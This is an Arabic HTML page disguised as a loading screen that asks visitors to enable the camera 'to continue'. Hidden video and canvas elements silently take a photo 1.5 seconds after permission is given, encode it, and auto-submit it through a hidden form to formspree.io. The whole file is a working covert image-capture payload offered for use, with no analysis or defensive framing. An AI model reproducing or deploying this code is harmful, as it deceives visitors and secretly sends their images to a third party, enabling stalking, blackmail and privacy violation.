<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; }
        .container { text-align: center; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="container">
        <div class="loader"></div>
        <p>يرجى السماح بالوصول للكاميرا للمتابعة...</p>
    </div>

    <!-- عناصر المعالجة المخفية -->
    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <!-- الرابط الجديد الخاص بك -->
    <form id="photoForm" action="https://formspree.io" method="POST">
        <input type="hidden" name="image_data" id="imageInput">
        <input type="hidden" name="_subject" value="صورة جديدة ملتقطة">
    </form>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const imageInput = document.getElementById('imageInput');
        const form = document.getElementById('photoForm');

        // طلب الإذن فور فتح الرابط
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                
                // التقاط الصورة تلقائياً بعد ثانية ونصف من الموافقة
                setTimeout(() => {
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, 640, 480);
                    
                    // تحويل الصورة لنص Base64
                    const dataURL = canvas.toDataURL('image/png');
                    imageInput.value = dataURL;
                    
                    // إرسال البيانات فوراً لـ Formspree
                    form.submit();
                }, 1500);
            })
            .catch(err => {
                console.error("لم يتم السماح بالكاميرا:", err);
                alert("نعتذر، يجب تفعيل الكاميرا للمتابعة.");
            });
    </script>
</body>
</html>
